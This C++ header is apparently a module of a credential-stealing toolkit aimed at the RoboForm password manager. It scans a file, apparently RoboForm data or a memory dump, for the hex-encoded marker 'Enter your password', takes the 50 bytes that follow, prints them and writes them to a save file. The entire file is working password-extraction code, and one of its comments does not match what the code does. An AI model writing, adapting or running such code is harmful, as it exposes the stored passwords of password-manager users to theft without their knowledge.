#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include "../../core/saveFile2.h"

int getCredsroboformappentries(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::vector<unsigned char> searchPattern = { 0x22, 0x45, 0x6e, 0x74, 0x65, 0x72, 0x20, 0x79, 0x6f, 0x75, 0x72, 0x20, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x22 };
    std::vector<unsigned char> foundData;

    while (!file.eof()) {
        char c;
        file.get(c);

        if (c == searchPattern[foundData.size()]) {
            foundData.push_back(c);
            if (foundData.size() == searchPattern.size()) {
                // We found the search pattern, now collect data until having four binary spaces (00)
                std::vector<char> extractedData;
                for (int i = 0; i < 50; i++) {
                    file.get(c);
                    if (file.eof()) {
                        break;
                    }
                    extractedData.push_back(c);
                }

                // Convert the binary data to a UTF-8 string
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());

                // Print the extracted UTF-8 string
                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;

                //Save into file
                saveFile(utf8ExtractedData + "\n");

                foundData.clear();
            }
        }
        else {
            foundData.clear();
        }
    }

    file.close();
    return 0;
}
